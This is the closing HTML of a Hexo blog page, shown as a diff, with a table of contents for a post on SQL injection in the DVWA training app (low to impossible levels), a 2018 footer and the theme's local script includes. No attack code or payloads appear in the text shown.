+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#dvwa-sql注入"><span class="nav-number">1.</span> <span class="nav-text">dvwa sql注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#sql注入"><span class="nav-number">1.0.1.</span> <span class="nav-text">sql注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#测试环境"><span class="nav-number">1.0.2.</span> <span class="nav-text">测试环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#low级别"><span class="nav-number">1.0.3.</span> <span class="nav-text">low级别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#medium级别"><span class="nav-number">1.0.4.</span> <span class="nav-text">medium级别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#high级别"><span class="nav-number">1.0.5.</span> <span class="nav-text">high级别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#impossible级别"><span class="nav-number">1.0.6.</span> <span class="nav-text">impossible级别</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Lawliet</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.3</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
